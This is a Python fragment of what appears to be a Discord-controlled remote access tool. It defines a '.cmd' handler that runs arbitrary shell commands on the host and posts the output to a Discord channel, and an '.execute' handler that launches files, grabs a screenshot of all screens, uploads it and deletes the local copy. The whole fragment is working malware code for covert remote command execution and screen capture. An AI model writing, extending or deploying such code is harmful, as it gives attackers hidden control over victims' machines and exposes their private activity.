from resources.misc import *
from PIL import ImageGrab
import subprocess
import asyncio
import os
# end of imports
# on reaction add
elif str(reaction) == '🔴' and reaction.message.content == '```End of command stdout```':
    #.log Reaction is "remove .cmd stdout messages" 
    for i in cmd_messages:
        await i.delete()
        #.log Removed a .cmd stdout message 
    cmd_messages = []
# on message
elif message.content[:4] == '.cmd':
    #.log Message is "run a command" 
    await message.delete()
    #.log Removed the message 
    if message.content.strip() == '.cmd':
        #.log Author issued empty .cmd command 
        reaction_msg = await message.channel.send('```Syntax: .cmd <command>```'); await reaction_msg.add_reaction('🔴')
        #.log Sent message with usage of ".cmd" 
    else:
        cmd_output = force_decode(subprocess.run(message.content[5:], capture_output= True, shell= True).stdout).strip()
        #.log Executed a CMD command 
        message_buffer, cmd_messages = '', []
        reaction_msg = await message.channel.send('```Executed command: ' + message.content[5:] + '\nstdout:```'); cmd_messages.append(reaction_msg)
        #.log Sent header message of CMD stdout 
        for line in range(1, len(cmd_output.split('\n'))):
            if len(message_buffer) + len(cmd_output.split('\n')[line]) > 1950:
                reaction_msg = await message.channel.send('```' + message_buffer + '```'); cmd_messages.append(reaction_msg)
                #.log Sent part of CMD stdout 
                message_buffer = cmd_output.split('\n')[line]
            else:
                message_buffer += cmd_output.split('\n')[line] + '\n'
        reaction_msg = await message.channel.send('```' + message_buffer + '```'); cmd_messages.append(reaction_msg)
        #.log Sent CMD stdout (last part or whole) 
        reaction_msg = await message.channel.send('```End of command stdout```'); await reaction_msg.add_reaction('🔴')
        #.log Sent footer message of CMD stdout 
elif message.content[:8] == '.execute':
    #.log Message is "execute a file" 
    await message.delete()
    #.log Removed the message 
    if message.channel.id == channel_ids['file']:
        #.log Message channel is file-related 
        if message.content.strip() == '.execute':
            #.log Author issued empty ".execute" 
            reaction_msg = await message.channel.send('```Syntax: .execute <filename>```'); await reaction_msg.add_reaction('🔴')
            #.log Sent message with usage of ".execute" 
        else:
            if os.path.exists('/'.join(working_directory) + '/' + message.content[9:]):
                #.log Requested file-to-execute does exist on this PC 
                try:
                    #.log Trying to execute the file 
                    file_extension = os.path.splitext(message.content[9:])[1]
                    subprocess.run('start "" "' + '/'.join(working_directory) + '/' + message.content[9:] + '"', shell=True)
                    #.log Executed the files 
                    await asyncio.sleep(1)
                    ImageGrab.grab(all_screens=True).save('ss.png')
                    #.log Saved a screenshot of this PCs screen 
                    reaction_msg = await message.channel.send(embed=discord.Embed(title=current_time() + ' `[Executed: ' + '/'.join(working_directory) + '/' + message.content[9:] + ']`').set_image(url='attachment://ss.png'), file=discord.File('ss.png')); await reaction_msg.add_reaction('📌')
                    #.log Sent embed with screenshot of this PC 
                    subprocess.run('del ss.png', shell=True)
                    #.log Removed the screenshot 
                    await message.channel.send('```Successfully executed: ' + message.content[9:] + '```')
                    #.log Sent message about success of execution 
                except Exception as e:
                    #.log Error occurred while trying to execute the file 
                    reaction_msg = await message.channel.send(f'```❗ Something went wrong...```\n{str(e)}'); await reaction_msg.add_reaction('🔴')
                    #.log Sent message about the error with more details 
            else:
                #.log Requested file-to-execute does not exist on this PC 
                reaction_msg = await message.channel.send('```❗ File or directory not found.```'); await reaction_msg.add_reaction('🔴')
                #.log Sent message about the missing file 
    else:
        #.log Message channel is not file-related 
        reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')
        #.log Sent message about wrong channel 
